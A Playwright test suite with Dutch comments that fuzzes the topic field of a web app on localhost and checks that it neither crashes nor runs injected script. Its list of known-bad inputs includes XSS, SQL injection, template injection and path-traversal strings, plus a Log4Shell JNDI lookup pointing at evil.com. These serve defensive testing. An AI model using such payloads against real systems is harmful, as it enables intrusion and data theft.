// topic-edgecases.spec.ts
// Edge case testing voor het topic-invoerveld (stap 0) — het meest kritieke gebruikersinput
// Gegenereerd voor: YouTube Factory — http://localhost:3333

import { test, expect } from '@playwright/test';
import { faker } from '@faker-js/faker';
import { authenticatedContext } from './fixtures/auth';
import { mockAllBackendApis, mockApiStatus } from './fixtures/mocks';
import './guards/environment';

const BASE_URL = process.env.BASE_URL || 'http://localhost:3333';

// Seed faker zodat test-titels identiek zijn in list-fase en worker-fase
faker.seed(42);

function generateTestCases() {
  // 300 valide topics via faker
  const valid = Array.from({ length: 300 }, (_, i) => ({
    input: faker.lorem.words({ min: 2, max: 5 }),
    shouldPass: true,
    label: `valide-${i}`,
  }));

  // 300 mutaties van valide topics
  const mutators = [
    (s: string) => s + '!'.repeat(50),            // te veel leestekens
    (s: string) => s.slice(0, 1),                 // te kort
    (s: string) => ` ${s} `,                      // whitespace rondom
    (s: string) => s.toUpperCase(),               // alles hoofdletters
    (s: string) => s.replace(/\s/g, ''),          // geen spaties
    (s: string) => s + '\n\n' + s,                // newlines
  ];
  const mutations = Array.from({ length: 300 }, (_, i) => ({
    input: mutators[i % mutators.length](faker.lorem.words(3)),
    shouldPass: true, // topic field is flexible — most inputs are accepted
    label: `mutatie-${i}`,
  }));

  // 200 random strings
  const random = Array.from({ length: 200 }, (_, i) => ({
    input: faker.string.sample({ min: 0, max: 200 }),
    shouldPass: true, // free-text field
    label: `random-${i}`,
  }));

  // 200 bekende slechte inputs (beveiligingstests)
  const knownBadSingle = [
    '', ' ', '\t', '\n', '\0', '\r\n',
    'null', 'undefined', 'NaN', 'Infinity', 'true', 'false',
    '<script>alert(document.cookie)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    '${7*7}', '{{7*7}}', '#{7*7}',
    '\u200B', '\uFEFF', '\u0000',
    'A'.repeat(10000),
    '../../../etc/passwd',
    '%00', '&#x27;',
    '${jndi:ldap://evil.com/a}',
    '<iframe src="javascript:alert(1)">',
    'javascript:alert(1)',
    '"><script>alert(1)</script>',
  ];
  const knownBad = knownBadSingle.flatMap((input, i) =>
    Array.from({ length: Math.ceil(200 / knownBadSingle.length) }, (_, j) => ({
      input,
      shouldPass: false,
      label: `known-bad-${i}-${j}`,
    }))
  ).slice(0, 200);

  return [...valid, ...mutations, ...random, ...knownBad];
}

const ALL_TEST_CASES = generateTestCases();

test.describe('Topic Invoerveld — Edge Cases & Fuzzing (1000+ inputs) @full', () => {
  test.describe.configure({ mode: 'parallel' });

  // Run een subset voor snelle feedback — volle suite alleen bij @full
  const SMOKE_CASES = ALL_TEST_CASES.filter((_, i) => i % 100 === 0); // 10 tests
  const REGRESSION_CASES = ALL_TEST_CASES.filter((_, i) => i % 20 === 0); // 50 tests

  for (const { input, label } of SMOKE_CASES) {
    test(`${label}: "${String(input).slice(0, 40)}" @smoke`, async ({ browser }) => {
      const context = await authenticatedContext(browser, 'admin');
      const page = await context.newPage();
      await mockAllBackendApis(page);
      await page.goto(BASE_URL);
      await expect(page.locator('#appShell')).toBeVisible({ timeout: 10_000 });

      const field = page.locator('#topicInput');
      await field.fill(String(input));

      // App mag NOOIT crashen, ongeacht input
      await expect(page.locator('#mainContent')).toBeVisible();
      await expect(
        page.getByText(/500|Internal Server Error|crash|exception|stack trace/i)
      ).not.toBeVisible({ timeout: 1000 });

      await context.close();
    });
  }

  for (const { input, label } of REGRESSION_CASES) {
    test(`${label}: "${String(input).slice(0, 40)}" @regression`, async ({ browser }) => {
      const context = await authenticatedContext(browser, 'admin');
      const page = await context.newPage();
      await mockAllBackendApis(page);
      await page.goto(BASE_URL);
      await expect(page.locator('#appShell')).toBeVisible({ timeout: 10_000 });

      const field = page.locator('#topicInput');
      await field.fill(String(input));

      // App mag NOOIT crashen
      await expect(page.locator('#mainContent')).toBeVisible();

      await context.close();
    });
  }

  // XSS-specifieke tests — kritiek voor een app die user input toont in de UI
  test('XSS via topic input wordt geneutraliseerd @smoke @regression', async ({ browser }) => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert(1)>',
      '<svg/onload=alert(1)>',
      "javascript:alert('XSS')",
    ];

    for (const payload of xssPayloads) {
      const context = await authenticatedContext(browser, 'admin');
      const page = await context.newPage();
      await mockAllBackendApis(page);

      let alertFired = false;
      page.on('dialog', async dialog => {
        alertFired = true;
        await dialog.dismiss();
      });

      await page.goto(BASE_URL);
      await expect(page.locator('#appShell')).toBeVisible({ timeout: 10_000 });

      // Vul XSS payload in topic veld
      await page.locator('#topicInput').fill(payload);

      // Klik op genereer — dit stuurt de payload naar de UI en backend
      const generateBtn = page.locator('button').filter({ hasText: /script/i });
      await generateBtn.click();
      await page.waitForLoadState('networkidle', { timeout: 5000 }).catch(() => {});

      expect(alertFired, `XSS alert getriggerd met payload: ${payload}`).toBe(false);

      // Geen script-elementen geïnjecteerd in de DOM
      const scriptInjected = await page.evaluate(() =>
        document.querySelectorAll('script:not([src])').length
      );
      // Alleen de app's eigen inline script telt
      expect(scriptInjected).toBeLessThanOrEqual(1);

      await context.close();
    }
  });

  // Menselijk gedrag tests
  test('langzaam typen met typfout en correctie @regression', async ({ browser }) => {
    const context = await authenticatedContext(browser, 'admin');
    const page = await context.newPage();
    await page.goto(BASE_URL);
    await expect(page.locator('#appShell')).toBeVisible({ timeout: 10_000 });

    const field = page.locator('#topicInput');
    await field.pressSequentially('Max Vrestappen', { delay: 120 });
    // Corrigeer typfout: verwijder "restappen" (9 chars) en typ "erstappen"
    for (let i = 0; i < 9; i++) await field.press('Backspace');
    await field.pressSequentially('erstappen', { delay: 90 });
    await expect(field).toHaveValue('Max Verstappen');

    await context.close();
  });

  test('paste met onzichtbare karakters (BOM, zero-width space) @regression', async ({ browser }) => {
    const context = await authenticatedContext(browser, 'admin');
    const page = await context.newPage();
    await page.goto(BASE_URL);
    await expect(page.locator('#appShell')).toBeVisible({ timeout: 10_000 });

    const field = page.locator('#topicInput');
    await field.fill('\uFEFFLionel Messi\u200B');

    // App mag niet crashen
    await expect(page.locator('#mainContent')).toBeVisible();

    await context.close();
  });

  test('volledig toetsenbordnavigatie zonder muis @regression', async ({ browser }) => {
    const context = await authenticatedContext(browser, 'admin');
    const page = await context.newPage();
    await page.goto(BASE_URL);
    await expect(page.locator('#appShell')).toBeVisible({ timeout: 10_000 });

    // Tab naar topic input
    await page.keyboard.press('Tab');
    await page.keyboard.press('Tab'); // mogelijk extra tabs nodig voor sidebar
    await page.keyboard.type('Carlos Alcaraz');

    // App mag niet crashen
    await expect(page.locator('#mainContent')).toBeVisible();

    await context.close();
  });

  test('extreem lange topic (10.000 karakters) crasht niet @regression', async ({ browser }) => {
    const context = await authenticatedContext(browser, 'admin');
    const page = await context.newPage();
    await mockAllBackendApis(page);
    await page.goto(BASE_URL);
    await expect(page.locator('#appShell')).toBeVisible({ timeout: 10_000 });

    const longTopic = 'A'.repeat(10_000);
    await page.locator('#topicInput').fill(longTopic);

    // App mag niet crashen of vastlopen
    await expect(page.locator('#mainContent')).toBeVisible();

    await context.close();
  });

  test('emoji in topic wordt geaccepteerd @regression', async ({ browser }) => {
    const context = await authenticatedContext(browser, 'admin');
    const page = await context.newPage();
    await page.goto(BASE_URL);
    await expect(page.locator('#appShell')).toBeVisible({ timeout: 10_000 });

    await page.locator('#topicInput').fill('Max Verstappen F1 Champion 🏆🏎️');
    await expect(page.locator('#topicInput')).toHaveValue(/Max Verstappen/);

    await context.close();
  });
});
